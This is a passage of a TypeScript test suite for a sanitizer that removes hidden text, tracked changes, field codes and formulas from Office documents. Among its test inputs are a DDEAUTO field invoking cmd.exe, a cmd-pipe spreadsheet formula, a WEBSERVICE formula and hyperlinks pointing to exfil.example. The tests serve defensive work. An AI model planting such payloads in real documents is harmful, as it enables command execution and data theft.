        'notesSlide2',
        'rIdSlide2',
        'rIdSlide4',
      ],
    )
    expect(everything(out.bytes)).toContain('NOTESVISIBLE')
    expect(out.removed.hiddenSlides).toBe(3)
  })
})

describe('Z2: hidden shapes and alt text', () => {
  it('drops a pptx shape with hidden="1" on p:cNvPr', async () => {
    const out = await disarmed(
      pptx({
        slides: [
          {
            shapes:
              shape('VISIBLE') +
              shape('HIDDENSHAPESENTINEL', { id: 3, cNvPr: 'hidden="1"' }) +
              shape('TRUESHAPESENTINEL', { id: 4, cNvPr: 'hidden="true"' }),
          },
        ],
      }),
      MIME.pptx,
      ['HIDDENSHAPESENTINEL', 'TRUESHAPESENTINEL'],
    )
    expect(out.removed.hiddenShapes).toBe(2)
  })

  it('drops a docx drawing with hidden="1" on wp:docPr, text box and all', async () => {
    const drawing =
      `<w:p><w:r><w:drawing><wp:anchor><wp:docPr id="5" name="box" hidden="1"/>` +
      `<a:graphic><a:graphicData uri="x"><wps:wsp><wps:txbx><w:txbxContent>${para('DOCPRSENTINEL')}</w:txbxContent></wps:txbx></wps:wsp>` +
      `</a:graphicData></a:graphic></wp:anchor></w:drawing></w:r></w:p>`
    await disarmed(docx({ body: para('VISIBLE') + drawing }), MIME.docx, ['DOCPRSENTINEL'])
  })

  it('strips descr and title on wp:docPr, pic:cNvPr and p:cNvPr', async () => {
    const pic =
      `<w:p><w:r><w:drawing><wp:inline><wp:docPr id="1" name="p" descr="DOCPRDESCRSENTINEL" title="DOCPRTITLESENTINEL"/>` +
      `<a:graphic><a:graphicData uri="x"><pic:pic><pic:nvPicPr><pic:cNvPr id="2" name="p" descr="PICDESCRSENTINEL" title="PICTITLESENTINEL"/>` +
      `<pic:cNvPicPr/></pic:nvPicPr></pic:pic></a:graphicData></a:graphic></wp:inline></w:drawing></w:r></w:p>`
    const w = await disarmed(docx({ body: para('VISIBLE') + pic }), MIME.docx, [
      'DOCPRDESCRSENTINEL',
      'DOCPRTITLESENTINEL',
      'PICDESCRSENTINEL',
      'PICTITLESENTINEL',
    ])
    expect(w.removed.altText).toBe(2)
    await disarmed(
      pptx({
        slides: [
          { shapes: shape('VISIBLE', { cNvPr: 'descr="PDESCRSENTINEL" title="PTITLESENTINEL"' }) },
        ],
      }),
      MIME.pptx,
      ['PDESCRSENTINEL', 'PTITLESENTINEL'],
    )
  })
})

describe('Z2: tracked changes — accepted structurally', () => {
  it('drops w:del and w:moveFrom; keeps w:ins and w:moveTo, unwrapped', async () => {
    const body =
      `<w:p>${run('VISIBLE')}<w:del w:id="1" w:author="a"><w:r><w:delText>DELSENTINEL</w:delText></w:r></w:del>` +
      `<w:ins w:id="2" w:author="a">${run('INSKEPT')}</w:ins></w:p>` +
      `<w:p><w:moveFromRangeStart w:id="3" w:name="m"/><w:moveFrom w:id="4" w:author="a">${run('MOVEFROMSENTINEL')}</w:moveFrom><w:moveFromRangeEnd w:id="3"/></w:p>` +
      `<w:p><w:moveToRangeStart w:id="5" w:name="m"/><w:moveTo w:id="6" w:author="a">${run('MOVETOKEPT')}</w:moveTo><w:moveToRangeEnd w:id="5"/></w:p>`
    const out = await disarmed(docx({ body }), MIME.docx, [
      'DELSENTINEL',
      'MOVEFROMSENTINEL',
      'w:ins',
      'w:moveTo',
      'moveFromRange',
    ])
    const all = everything(out.bytes)
    expect(all).toContain('INSKEPT')
    expect(all).toContain('MOVETOKEPT')
    expect(out.removed.deletions).toBe(2)
  })

  it('drops a deleted table row and a stray w:delText', async () => {
    const body =
      '<w:tbl><w:tblGrid><w:gridCol/></w:tblGrid>' +
      `<w:tr><w:tc>${para('VISIBLE')}</w:tc></w:tr>` +
      `<w:tr><w:trPr><w:del w:id="1" w:author="a"/></w:trPr><w:tc>${para('DELROWSENTINEL')}</w:tc></w:tr></w:tbl>` +
      '<w:p><w:r><w:delText>STRAYDELSENTINEL</w:delText></w:r></w:p>'
    await disarmed(docx({ body }), MIME.docx, ['DELROWSENTINEL', 'STRAYDELSENTINEL'])
  })

  it('drops property revisions (the old formatting)', async () => {
    const body =
      `<w:p><w:pPr><w:pPrChange w:id="1" w:author="a"><w:pPr><w:pStyle w:val="PPRCHANGESENTINEL"/></w:pPr></w:pPrChange></w:pPr>` +
      `${run('VISIBLE', '<w:b/><w:rPrChange w:id="2" w:author="a"><w:rPr><w:rStyle w:val="RPRCHANGESENTINEL"/></w:rPr></w:rPrChange>')}</w:p>`
    const out = await disarmed(docx({ body }), MIME.docx, [
      'PPRCHANGESENTINEL',
      'RPRCHANGESENTINEL',
    ])
    expect(out.removed.formatRevisions).toBe(2)
  })
})

describe('Z2: field codes and DDE', () => {
  const field = (instr: string, result: string, codeText = '') =>
    `<w:r><w:fldChar w:fldCharType="begin"/></w:r>` +
    `<w:r><w:instrText xml:space="preserve">${instr}</w:instrText></w:r>` +
    (codeText ? `<w:r><w:t>${codeText}</w:t></w:r>` : '') +
    `<w:r><w:fldChar w:fldCharType="separate"/></w:r>` +
    `${run(result)}<w:r><w:fldChar w:fldCharType="end"/></w:r>`

  it('a DDEAUTO field: the instruction goes, the result stays', async () => {
    const out = await disarmed(
      docx({
        body: `<w:p>${field('DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe "/k DDESENTINEL"', 'VISIBLE')}</w:p>`,
      }),
      MIME.docx,
      ['DDESENTINEL', 'instrText', 'fldChar', 'DDEAUTO'],
    )
    expect(out.removed.fieldCodes).toBeGreaterThan(0)
  })

  it('text between begin and separate is field code, and is dropped', async () => {
    await disarmed(
      docx({ body: `<w:p>${field('QUOTE "x"', 'VISIBLE', 'CODETEXTSENTINEL')}</w:p>` }),
      MIME.docx,
      ['CODETEXTSENTINEL'],
    )
  })

  it('a nested field: the outer field code after the inner field ends is still code', async () => {
    const nested =
      `<w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText>IF </w:instrText></w:r>` +
      field('PAGE', '1') +
      `<w:r><w:t>OUTERCODESENTINEL</w:t></w:r>` +
      `<w:r><w:fldChar w:fldCharType="separate"/></w:r>${run('VISIBLE')}<w:r><w:fldChar w:fldCharType="end"/></w:r>`
    await disarmed(docx({ body: `<w:p>${nested}</w:p>` }), MIME.docx, ['OUTERCODESENTINEL'])
  })

  it('a field spanning paragraphs drops its code in every paragraph it covers', async () => {
    const body =
      `<w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText>INCLUDETEXT</w:instrText></w:r></w:p>` +
      `<w:p><w:r><w:t>SPANCODESENTINEL</w:t></w:r><w:r><w:fldChar w:fldCharType="separate"/></w:r>${run('VISIBLE')}` +
      `<w:r><w:fldChar w:fldCharType="end"/></w:r></w:p>`
    await disarmed(docx({ body }), MIME.docx, ['SPANCODESENTINEL'])
  })

  it('a form field’s data (help and status text) goes with its field character', async () => {
    const ff =
      `<w:r><w:fldChar w:fldCharType="begin"><w:ffData><w:name w:val="f"/><w:helpText w:type="text" w:val="FFHELPSENTINEL"/>` +
      `<w:statusText w:type="text" w:val="FFSTATUSSENTINEL"/></w:ffData></w:fldChar></w:r>` +
      `<w:r><w:instrText>FORMTEXT</w:instrText></w:r><w:r><w:fldChar w:fldCharType="separate"/></w:r>${run('VISIBLE')}` +
      `<w:r><w:fldChar w:fldCharType="end"/></w:r>`
    await disarmed(docx({ body: `<w:p>${ff}</w:p>` }), MIME.docx, [
      'FFHELPSENTINEL',
      'FFSTATUSSENTINEL',
    ])
  })

  it('w:fldSimple: the instruction goes, the result runs stay', async () => {
    await disarmed(
      docx({
        body: `<w:p><w:fldSimple w:instr="DDEAUTO FLDSIMPLESENTINEL">${run('VISIBLE')}</w:fldSimple></w:p>`,
      }),
      MIME.docx,
      ['FLDSIMPLESENTINEL', 'fldSimple'],
    )
  })

  it('xlsx: cell formulas go and their cached values stay; defined names go', async () => {
    const sheet =
      '<sheetData><row r="1">' +
      `<c r="A1" t="str"><f>cmd|' /C FORMULASENTINEL'!A0</f><v>VISIBLE</v></c>` +
      `<c r="B1"><f t="shared" ref="B1:B2" si="0">WEBSERVICE("https://exfil.example/SHAREDSENTINEL")</f><v>1</v></c>` +
      '</row></sheetData>'
    const out = await disarmed(
      xlsx({
        sheets: [{ name: 'S', xml: sheet }],
        workbookExtra: `<definedNames><definedName name="auto_open" hidden="1">DEFNAMESENTINEL!A1</definedName></definedNames>`,
      }),
      MIME.xlsx,
      ['FORMULASENTINEL', 'SHAREDSENTINEL', 'DEFNAMESENTINEL', '<f', 'definedName'],
    )
    expect(out.removed.formulas).toBe(2)
    expect(out.removed.definedNames).toBe(1)
  })
})

describe('Z2: footnotes and endnotes no visible reference points at', () => {
  it('keeps a referenced note; drops an unreferenced one and one whose reference is hidden', async () => {
    const body =
      `<w:p>${run('VISIBLE')}<w:r><w:footnoteReference w:id="1"/></w:r>` +
      `<w:r><w:rPr><w:vanish/></w:rPr><w:footnoteReference w:id="2"/></w:r>` +
      `<w:r><w:endnoteReference w:id="1"/></w:r></w:p>`
    const notes = (kind: 'footnotes' | 'endnotes', el: string, items: [number, string][]) =>
      wNotes(kind, items.map(([id, t]) => `<w:${el} w:id="${id}">${para(t)}</w:${el}>`).join(''))
    const out = await disarmed(
      docx({
        body,
        footnotes: notes('footnotes', 'footnote', [
          [1, 'FOOTKEPT'],
          [2, 'HIDDENREFSENTINEL'],
          [3, 'UNREFSENTINEL'],
        ]),
        endnotes: notes('endnotes', 'endnote', [
          [1, 'ENDKEPT'],
          [2, 'ENDUNREFSENTINEL'],
        ]),
      }),
      MIME.docx,
      ['HIDDENREFSENTINEL', 'UNREFSENTINEL', 'ENDUNREFSENTINEL'],
    )
    const all = everything(out.bytes)
    expect(all).toContain('FOOTKEPT')
    expect(all).toContain('ENDKEPT')
    expect(all).toContain('w:separator')
    expect(out.removed.unreferencedNotes).toBe(3)
  })
})

describe('Z2: references to a dropped part', () => {
  it('a reference-only element goes; an element with content keeps its content', async () => {
    const body =
      para('VISIBLE') +
      `<w:p><w:r><w:t>LINKTEXT</w:t></w:r></w:p>` +
      `<w:sectPr><w:headerReference w:type="default" r:id="rIdHdr"/><w:footerReference w:type="default" r:id="rIdFtr"/></w:sectPr>`
    const out = await disarmed(
      docx({
        body,
        docRels: [
          { id: 'rIdHdr', type: RT.header, target: 'header1.xml' },
          { id: 'rIdFtr', type: RT.footer, target: 'footer1.xml' },
        ],
        parts: [
          {
            name: 'word/header1.xml',
            type: CT.wHeader,
            body: `<w:hdr xmlns:w="${NS.w}">${para('HDRSENTINEL')}</w:hdr>`,
          },
          {
            name: 'word/footer1.xml',
            type: CT.wFooter,
            body: `<w:ftr xmlns:w="${NS.w}">${para('FTRSENTINEL')}</w:ftr>`,
          },
        ],
      }),
      MIME.docx,
      ['HDRSENTINEL', 'FTRSENTINEL', 'headerReference', 'footerReference', 'rIdHdr'],
    )
    expect(out.removed.references).toBe(2)
    expect(unpack(out.bytes).get('word/document.xml')).toContain('<w:sectPr/>')
  })
})

// ============================================================================
// Counted, not dropped (spec §5.3 step 2) — and so hiddenContent: 'not-removed' (A3)
// ============================================================================

describe('Z2: concealment is counted, not dropped', () => {
  it('xlsx: hidden rows and columns, zero heights and widths', async () => {
    const sheet =
      '<sheetFormatPr defaultRowHeight="15"/>' +
      '<cols><col min="1" max="1" width="10"/><col min="2" max="2" hidden="1"/><col min="3" max="3" width="0"/></cols>' +
      `<sheetData>${row(1, ['VISIBLE'])}${row(2, ['ROWHIDDENKEPT'], ' hidden="1"')}${row(3, ['ROWZEROKEPT'], ' ht="0" customHeight="1"')}</sheetData>`
    const out = await disarmed(xlsx({ sheets: [{ name: 'S', xml: sheet }] }), MIME.xlsx, [])
    const all = everything(out.bytes)
    expect(all).toContain('ROWHIDDENKEPT')
    expect(all).toContain('ROWZEROKEPT')
    expect(out.counted).toEqual({
      hiddenRows: 1,
      hiddenColumns: 1,
      zeroRowHeights: 1,
      zeroColumnWidths: 1,
    })
  })

  it('xlsx: a sheet whose rows are hidden by default, or zero high by default', async () => {
    const out = await disarmed(
      xlsx({
        sheets: [
          {
            name: 'S',
            xml: `<sheetFormatPr defaultRowHeight="0" defaultColWidth="0" zeroHeight="1"/><sheetData>${row(1, ['VISIBLE'])}</sheetData>`,
          },
        ],
      }),
      MIME.xlsx,
      [],
    )
    expect(out.counted).toEqual({ hiddenRows: 1, zeroRowHeights: 1, zeroColumnWidths: 1 })
  })

  it('xlsx: the ;;; number format, and a font colour equal to its fill', async () => {
    const styles = sStyles({
      numFmts: '<numFmt numFmtId="164" formatCode=";;;"/>',
      fonts: [
        '<font><sz val="11"/></font>',
        '<font><color rgb="FF00FF00"/></font>',
        '<font><color rgb="FFFFFFFF"/></font>',
      ],
      fills: [
        '<fill><patternFill patternType="none"/></fill>',
        '<fill><patternFill patternType="gray125"/></fill>',
        '<fill><patternFill patternType="solid"><fgColor rgb="FF00FF00"/></patternFill></fill>',
      ],
      xfs: [
        '<xf numFmtId="0" fontId="0" fillId="0"/>',
        '<xf numFmtId="164" fontId="0" fillId="0"/>',
        '<xf numFmtId="0" fontId="1" fillId="2"/>',
        '<xf numFmtId="0" fontId="2" fillId="0"/>',
      ],
    })
    const cell = (ref: string, s: number, t: string) =>
      `<c r="${ref}" s="${s}" t="inlineStr"><is><t>${t}</t></is></c>`
    const sheet = `<sheetData><row r="1">${cell('A1', 0, 'VISIBLE')}${cell('B1', 1, 'FORMATKEPT')}${cell('C1', 2, 'GREENKEPT')}${cell('D1', 3, 'WHITEKEPT')}</row></sheetData>`
    const out = await disarmed(xlsx({ sheets: [{ name: 'S', xml: sheet }], styles }), MIME.xlsx, [])
    expect(everything(out.bytes)).toContain('GREENKEPT')
    expect(out.counted).toEqual({ hiddenNumberFormats: 1, fontMatchesFill: 2 })
  })

  it('docx: white text and text of 1 pt or less, direct or through a style', async () => {
    const styles = wStyles(
      DOCX_STYLES_NORMAL +
        '<w:style w:type="character" w:styleId="Tiny"><w:rPr><w:sz w:val="1"/></w:rPr></w:style>',
    )
    const body =
      `<w:p>${run('VISIBLE')}${run('WHITEKEPT', '<w:color w:val="FFFFFF"/>')}` +
      `${run('THEMEWHITEKEPT', '<w:color w:val="000000" w:themeColor="background1"/>')}` +
      `${run('TINYKEPT', '<w:sz w:val="2"/>')}${run('TINYSTYLEKEPT', '<w:rStyle w:val="Tiny"/>')}</w:p>`
    const out = await disarmed(docx({ body, styles }), MIME.docx, [])
    expect(everything(out.bytes)).toContain('TINYSTYLEKEPT')
    expect(out.counted).toEqual({ whiteText: 2, tinyText: 2 })
  })

  it('pptx: white text, text of 1 pt or less, and a shape placed off the slide', async () => {
    const off = '<a:xfrm><a:off x="9144000" y="0"/><a:ext cx="100" cy="100"/></a:xfrm>'
    const neg = '<a:xfrm><a:off x="-500" y="0"/><a:ext cx="400" cy="100"/></a:xfrm>'
    const on = '<a:xfrm><a:off x="0" y="0"/><a:ext cx="100" cy="100"/></a:xfrm>'
    const out = await disarmed(
      pptx({
        slides: [
          {
            shapes:
              shape('VISIBLE', { xfrm: on }) +
              shape('WHITEKEPT', {
                id: 3,
                rPr: '<a:rPr><a:solidFill><a:srgbClr val="FFFFFF"/></a:solidFill></a:rPr>',
              }) +
              shape('SCHEMEWHITEKEPT', {
                id: 4,
                rPr: '<a:rPr><a:solidFill><a:schemeClr val="bg1"/></a:solidFill></a:rPr>',
              }) +
              shape('TINYKEPT', { id: 5, rPr: '<a:rPr sz="100"/>' }) +
              shape('OFFSLIDEKEPT', { id: 6, xfrm: off }) +
              shape('LEFTKEPT', { id: 7, xfrm: neg }),
          },
        ],
      }),
      MIME.pptx,
      [],
    )
    expect(everything(out.bytes)).toContain('OFFSLIDEKEPT')
    expect(out.counted).toEqual({ whiteText: 2, tinyText: 1, offSlideShapes: 2 })
  })

  it('anything counted makes flattenDocument report not-removed, so unattended picks Remove (A3)', async () => {
    const doc = await flattenDocument(
      {
        bytes: docx({ body: `<w:p>${run('VISIBLE', '<w:color w:val="ffffff"/>')}</w:p>` }),
        filename: 'x',
        mimeType: MIME.docx,
      },
      { convert: async () => 'VISIBLE', disarm: ooxmlDisarm },
    )
    expect(doc.report.counted).toEqual({ whiteText: 1 })
    expect(doc.report.hiddenContent).toBe('not-removed')
    expect(sanitizeOptionFor(doc)).toEqual({ unattended: false })
  })
})

// ============================================================================
// Markup compatibility: every element rule applies inside mc:Choice AND mc:Fallback
// ============================================================================

describe('Z2: every element rule holds inside mc:Choice and mc:Fallback', () => {
  /** Paragraph content carrying one rule's carrier, by name. */
  const carriers: Record<string, { xml: (s: string) => string; rels?: Rel[] }> = {
    vanish: { xml: (s) => run(s, '<w:vanish/>') },
    deletion: {
      xml: (s) => `<w:del w:id="9" w:author="a"><w:r><w:delText>${s}</w:delText></w:r></w:del>`,
    },
    moveFrom: { xml: (s) => `<w:moveFrom w:id="9" w:author="a">${run(s)}</w:moveFrom>` },
    fieldCode: {
      xml: (s) =>
        `<w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText>${s}</w:instrText></w:r>` +
        `<w:r><w:fldChar w:fldCharType="separate"/></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r>`,
    },
    fldSimple: { xml: (s) => `<w:fldSimple w:instr="${s}"/>` },
    hiddenShape: {
      xml: (s) =>
        `<w:r><w:drawing><wp:inline><wp:docPr id="7" name="d" hidden="1"/><a:graphic><a:graphicData uri="x">` +
        `<wps:wsp><wps:txbx><w:txbxContent>${para(s)}</w:txbxContent></wps:txbx></wps:wsp></a:graphicData></a:graphic></wp:inline></w:drawing></w:r>`,
    },
    altText: {
      xml: (s) =>
        `<w:r><w:drawing><wp:inline><wp:docPr id="8" name="d" descr="${s}"/></wp:inline></w:drawing></w:r>`,
    },
    oleObject: {
      xml: (s) =>
        `<w:r><w:object><o:OLEObject Type="Embed" ProgID="${s}" r:id="rIdOle"/></w:object></w:r>`,
      rels: [{ id: 'rIdOle', type: RT.oleObject, target: 'embeddings/oleObject1.bin' }],
    },
    commentMarker: { xml: (s) => `<w:commentRangeStart w:id="0" w:author="${s}"/>` },
    reference: {
      xml: (s) => `<w:hyperlink r:id="rIdExt">${run(s.toLowerCase())}</w:hyperlink>`,
      rels: [
        { id: 'rIdExt', type: RT.hyperlink, target: 'https://exfil.example/', external: true },
      ],
    },
  }

  for (const [rule, { xml, rels }] of Object.entries(carriers)) {
    for (const branch of ['choice', 'fallback'] as const) {
      it(`${rule} in mc:${branch === 'choice' ? 'Choice' : 'Fallback'}`, async () => {
        const sentinel = `${rule.toUpperCase()}IN${branch.toUpperCase()}SENTINEL`
        const body =
          para('VISIBLE') +
          `<w:p>${inAlternateContent(xml(sentinel), branch, run('OTHERBRANCH'))}</w:p>`
        const gone = rule === 'reference' ? ['rIdExt', 'exfil.example'] : [sentinel]
        await disarmed(docx({ body, docRels: rels }), MIME.docx, gone)
      })
    }
  }

  it('a hiding rule in one branch drops the whole mc:AlternateContent, the other branch’s copy too', async () => {
    const hidden = run('CHOICEHIDDEN', '<w:vanish/>')
    const body =
      para('VISIBLE') +
      `<w:p>${inAlternateContent(hidden, 'choice', run('FALLBACKCOPYSENTINEL'))}</w:p>`
    const out = await disarmed(docx({ body }), MIME.docx, ['CHOICEHIDDEN', 'FALLBACKCOPYSENTINEL'])
    expect(out.removed.alternateContent).toBe(1)
  })

  it('a branch with no hiding rule keeps both branches (sanitized)', async () => {
    const body = `<w:p>${inAlternateContent(run('VISIBLE'), 'choice', run('FALLBACKKEPT'))}</w:p>`
    const out = await disarmed(docx({ body }), MIME.docx, [])
    expect(everything(out.bytes)).toContain('FALLBACKKEPT')
  })

  it('a hidden pptx shape inside mc:Fallback', async () => {
    const ac = inAlternateContent(
      shape('PFALLBACKSENTINEL', { id: 3, cNvPr: 'hidden="1"' }),
      'fallback',
      '',
    )
    await disarmed(pptx({ slides: [{ shapes: shape('VISIBLE') + ac }] }), MIME.pptx, [
      'PFALLBACKSENTINEL',
    ])
  })

  it('a formula inside mc:Fallback', async () => {
    const sheet =
      `<sheetData><row r="1"><c r="A1" t="str"><f>A2</f><v>VISIBLE</v></c></row></sheetData>` +
      inAlternateContent(
        '<x14:dummy xmlns:x14="urn:x14"/>',
        'choice',
        `<c xmlns="${NS.s}"><f>FFALLBACKSENTINEL</f></c>`,
      )
    await disarmed(xlsx({ sheets: [{ name: 'S', xml: sheet }] }), MIME.xlsx, ['FFALLBACKSENTINEL'])
  })
})

// ============================================================================
// Matched by namespace URI, never by prefix (F11)
// ============================================================================

describe('Z2: the rules match the namespace URI, whatever the prefix', () => {
  it('a non-w prefix bound to WordprocessingML: vanish, del, instrText, object', async () => {
    const x = `xmlns:x="${NS.w}"`
    const body =
      para('VISIBLE') +
      `<w:p><w:r><w:rPr><x:vanish ${x}/></w:rPr><w:t>XVANISHSENTINEL</w:t></w:r></w:p>` +
      `<w:p><x:del ${x} x:id="1" x:author="a"><x:r><x:delText>XDELSENTINEL</x:delText></x:r></x:del></w:p>` +
      `<w:p><x:r ${x}><x:instrText>XINSTRSENTINEL</x:instrText></x:r></w:p>` +
      `<w:p><x:r ${x}><x:object><x:control x:name="XOBJECTSENTINEL"/></x:object></x:r></w:p>`
    await disarmed(docx({ body }), MIME.docx, [
      'XVANISHSENTINEL',
      'XDELSENTINEL',
      'XINSTRSENTINEL',
      'XOBJECTSENTINEL',
    ])
  })

  it('a default-namespace document: unprefixed WordprocessingML elements', async () => {
    const body = `<p xmlns="${NS.w}"><r><t>VISIBLE</t></r><r><rPr><vanish/></rPr><t>DEFAULTNSSENTINEL</t></r></p>`
    await disarmed(docx({ body }), MIME.docx, ['DEFAULTNSSENTINEL'])
  })

  it('wp, pic, r and mc under other prefixes', async () => {
    const body =
      para('VISIBLE') +
      `<w:p><w:r><w:drawing><q:inline xmlns:q="${NS.wp}"><q:docPr id="1" name="d" hidden="1"/>` +
      `<a:graphic><a:graphicData uri="x"><wps:wsp><wps:txbx><w:txbxContent>${para('QDOCPRSENTINEL')}</w:txbxContent></wps:txbx></wps:wsp></a:graphicData></a:graphic></q:inline></w:drawing></w:r></w:p>` +
      `<w:p><w:r><w:drawing><wp:inline><wp:docPr id="2" name="d"/><a:graphic><a:graphicData uri="x"><z:pic xmlns:z="${NS.pic}"><z:nvPicPr><z:cNvPr id="3" name="d" descr="ZDESCRSENTINEL"/></z:nvPicPr></z:pic></a:graphicData></a:graphic></wp:inline></w:drawing></w:r></w:p>` +
      `<w:p><w:hyperlink xmlns:rel="${NS.r}" rel:id="rIdExt">${run('LINKKEPT')}</w:hyperlink></w:p>` +
      `<w:p>${inAlternateContent(run('ALTSENTINEL', '<w:vanish/>'), 'fallback', run('ALTOTHER'), 'alt')}</w:p>`
    await disarmed(
      docx({
        body,
        docRels: [
          { id: 'rIdExt', type: RT.hyperlink, target: 'https://exfil.example/', external: true },
        ],
      }),
      MIME.docx,
      ['QDOCPRSENTINEL', 'ZDESCRSENTINEL', 'rIdExt', 'ALTSENTINEL'],
    )
  })

  it('the w prefix bound to ANOTHER namespace is not WordprocessingML', async () => {
    const body = `<w:p>${run('VISIBLE')}<w:r><w:rPr><w:vanish xmlns:w="urn:not-wordprocessingml"/></w:rPr><w:t>NOTWMLKEPT</w:t></w:r></w:p>`
    const out = await disarmed(docx({ body }), MIME.docx, [])
    expect(everything(out.bytes)).toContain('NOTWMLKEPT')
  })

  it('spreadsheet and presentation rules under other prefixes', async () => {
    const sheet = `<sheetData><x:row xmlns:x="${NS.s}" r="1" x:dummy="1" hidden="1"><x:c r="A1" t="str"><x:f>XFSENTINEL</x:f><x:v>VISIBLE</x:v></x:c></x:row></sheetData>`
    const s = await disarmed(xlsx({ sheets: [{ name: 'S', xml: sheet }] }), MIME.xlsx, [
      'XFSENTINEL',
    ])
    expect(s.counted).toEqual({ hiddenRows: 1 })
    const pShape = `<k:sp xmlns:k="${NS.p}"><k:nvSpPr><k:cNvPr id="3" name="s" hidden="1"/><k:cNvSpPr/><k:nvPr/></k:nvSpPr><k:txBody><a:bodyPr/><a:p><a:r><a:t>KSHAPESENTINEL</a:t></a:r></a:p></k:txBody></k:sp>`
    await disarmed(pptx({ slides: [{ shapes: shape('VISIBLE') + pShape }] }), MIME.pptx, [
      'KSHAPESENTINEL',
    ])
  })
})

// ============================================================================
// Refusals: the disarm throws rather than returning something it did not finish
// ============================================================================

describe('the disarm throws instead of returning a partial package', () => {
  const W_EMPTY = `<w:document xmlns:w="${NS.w}"><w:body/></w:document>`

  it('an unsupported type', async () => {
    const dotx = 'application/vnd.openxmlformats-officedocument.wordprocessingml.template'
    expect(await refusalOf(ooxmlDisarm(docx({ body: para('x') }), dotx))).toBe('unsupported-type')
  })

  it('no main part: no officeDocument relationship, or one whose target is missing (F12)', async () => {
    const none = buildPackage({
      main: { name: 'word/document.xml', type: CT.docxMain, body: W_EMPTY },
      officeDocument: null,
    })
    const missing = buildPackage({
      main: { name: 'word/other.xml', type: CT.docxMain, body: W_EMPTY },
      officeDocument: 'word/document.xml',
    })
    expect(await refusalOf(ooxmlDisarm(none, MIME.docx))).toBe('no-main-part')
    expect(await refusalOf(ooxmlDisarm(missing, MIME.docx))).toBe('no-main-part')
  })

  it('a main part elsewhere, of another type, or of another package type (F12)', async () => {
    const elsewhere = buildPackage({
      main: { name: 'word/other.xml', type: CT.docxMain, body: W_EMPTY },
    })
    const wrongType = buildPackage({
      main: { name: 'word/document.xml', type: CT.xlsxMain, body: W_EMPTY },
    })
    expect(await refusalOf(ooxmlDisarm(elsewhere, MIME.docx))).toBe('content-type')
    expect(await refusalOf(ooxmlDisarm(wrongType, MIME.docx))).toBe('content-type')
    expect(await refusalOf(ooxmlDisarm(docx({ body: para('x') }), MIME.xlsx))).toBe('content-type')
    expect(await refusalOf(ooxmlDisarm(docx({ body: para('x') }), MIME.docm))).toBe('content-type')
    expect(
      await refusalOf(ooxmlDisarm(docx({ body: para('x'), macroEnabled: true }), MIME.docx)),
    ).toBe('content-type')
  })

  it('two relationships with one Id in a kept part', async () => {
    const bytes = docx({
      body: para('x'),
      styles: wStyles(''),
      docRels: [{ id: 'rIdStyles', type: RT.theme, target: 'theme/theme1.xml' }],
    })
    expect(await refusalOf(ooxmlDisarm(bytes, MIME.docx))).toBe('content-type')
  })

  it('a relationships part, or the content types, over 1 MiB (A1)', async () => {
    const bigRels = docx({
      body: para('x'),
      docRels: [{ id: 'rIdPad', type: RT.settings, target: `${'a'.repeat(1024 * 1024)}.xml` }],
    })
    expect(await refusalOf(ooxmlDisarm(bigRels, MIME.docx))).toBe('content-type')
    const bigTypes = buildPackage({
      main: { name: 'word/document.xml', type: CT.docxMain, body: W_EMPTY },
      parts: [{ name: 'pad.xml', type: `application/x-${'p'.repeat(1024 * 1024)}`, body: '<r/>' }],
    })
    expect(await refusalOf(ooxmlDisarm(bigTypes, MIME.docx))).toBe('content-type')
  })

  it('a zip limit refuses through the S5 reader', async () => {
    const bytes = docx({ body: para('x') })
    expect(await refusalOf(ooxmlDisarm(bytes.slice(0, bytes.length - 1), MIME.docx))).toBe(
      'eocd' satisfies ZipRefusal,
    )
  })

  it('a kept part over the tree budget refuses with xml-nodes (A1)', async () => {
    // Each paragraph is two nodes (the element and its attribute), and the
    // numbers keep the part under the reader's 100:1 ratio once deflated.
    const half = XML_LIMITS.maxTreeNodes / 2
    const body = Array.from({ length: half + 1 }, (_, i) => `<w:p n="${i}"/>`).join('')
    expect(await refusalOf(ooxmlDisarm(docx({ body }), MIME.docx))).toBe('xml-nodes')
  })

  it('a disarm throw makes Sanitize unavailable; the raw file is never the fallback', async () => {
    const convert = vi.fn(async () => 'never')
    const bytes = docx({
      body: para('x'),
      styles: wStyles(''),
      docRels: [{ id: 'rIdStyles', type: RT.theme, target: 'theme/theme1.xml' }],
    })
    let thrown: unknown
    try {
      await flattenDocument(
        { bytes, filename: 'x', mimeType: MIME.docx },
        { convert, disarm: ooxmlDisarm },
      )
    } catch (err) {
      thrown = err
    }
    expect(thrown).toBeInstanceOf(DocumentRefusedError)
    expect(convert).not.toHaveBeenCalled()
    expect(sanitizeOptionFor({ error: thrown }).unavailable).toBeDefined()
  })
})
